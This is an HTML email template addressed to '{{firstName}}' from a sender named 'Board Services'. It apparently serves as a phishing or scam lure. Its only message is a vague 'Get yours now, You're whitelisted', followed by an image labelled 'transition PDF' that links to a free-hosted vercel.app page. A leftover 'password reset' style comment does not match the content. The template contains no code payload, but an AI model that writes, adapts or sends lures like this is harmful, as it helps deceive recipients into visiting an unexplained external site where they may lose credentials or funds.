<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="x-sender-name" content="Board Services">
    <title>Welcome to Our Service!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .header {
            background-color: #fcfdfd; /* Yellow header for password reset */
            color: #ffffff;
            padding: 10px 0;
            text-align: center;
            border-radius: 8px 8px 0 0;
        }
        .content {
            padding: 20px;
            text-align: left;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888888;
            text-align: center;
        }
        .button {
            display: inline-block;
            background-color: #ffc107;
            color: #ffffff;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://i.pinimg.com/736x/b2/c8/e9/b2c8e934da2988b33f0b6d857e58606a.jpg" alt="Company Logo" style="max-width: 100px; height: auto;">
        </div>
        <div class="content">
            <p>Hey {{firstName}},</p>
            <p>Get yours now, You're whitelisted</p>
            <p>Thank you for the long wait.</p>

            <a href="https://dainteractive-15v.vercel.app/"><img src="https://i.pinimg.com/736x/f4/9d/b0/f49db0c0db52c33f6a09a503ac8273f0.jpg" alt="transition PDF" width="130"></a>
            <p><small>Sent to: {{firstName}}</small></p>
            <p><small>Sent on: {{timestamp}}</small></p>
        </div>
    </div>
</body>
</html>
